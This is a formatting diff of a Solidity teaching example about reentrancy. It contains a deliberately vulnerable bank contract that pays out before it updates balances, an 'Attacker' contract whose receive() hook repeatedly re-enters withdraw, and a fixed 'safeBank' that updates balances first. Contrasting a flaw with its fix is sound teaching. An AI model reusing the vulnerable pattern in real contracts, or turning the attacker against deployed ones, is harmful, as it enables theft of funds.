@@ -33,22 +33,22 @@ error notEnough();
 contract VunlerableBank {
     mapping(address => uint256) public balanceOf;
 
-    function deposite() payable public {
+    function deposite() public payable {
         balanceOf[msg.sender] += msg.value;
     }
 
     function withdraw(uint256 amount) public {
-        if(balanceOf[msg.sender] < amount) revert notEnough();
+        if (balanceOf[msg.sender] < amount) revert notEnough();
 
-        (bool success, ) = msg.sender.call{value: amount}(""); 
+        (bool success,) = msg.sender.call{value: amount}("");
         require(success, "failed transaction");
 
-        balanceOf[msg.sender] -= amount; 
+        balanceOf[msg.sender] -= amount;
     }
 }
 
 contract Attacker {
-    VunlerableBank public target;  
+    VunlerableBank public target;
     uint256 public starter = 1 ether;
 
     constructor(address _target) {
@@ -62,25 +62,25 @@ contract Attacker {
     }
 
     receive() external payable {
-        if(address(target).balance >= starter){
+        if (address(target).balance >= starter) {
             target.withdraw(starter);
         }
     }
 }
 
 contract safeBank {
-     mapping(address => uint256) public balanceOf;
+    mapping(address => uint256) public balanceOf;
 
-    function deposite() payable public {
+    function deposite() public payable {
         balanceOf[msg.sender] += msg.value;
     }
 
     function withdraw(uint256 amount) public {
-        if(balanceOf[msg.sender] < amount) revert notEnough();
-        
-        balanceOf[msg.sender] -= amount; 
+        if (balanceOf[msg.sender] < amount) revert notEnough();
 
-        (bool success, ) = msg.sender.call{value: amount}("");
+        balanceOf[msg.sender] -= amount;
+
+        (bool success,) = msg.sender.call{value: amount}("");
         require(success, "failed transaction");
     }
 }
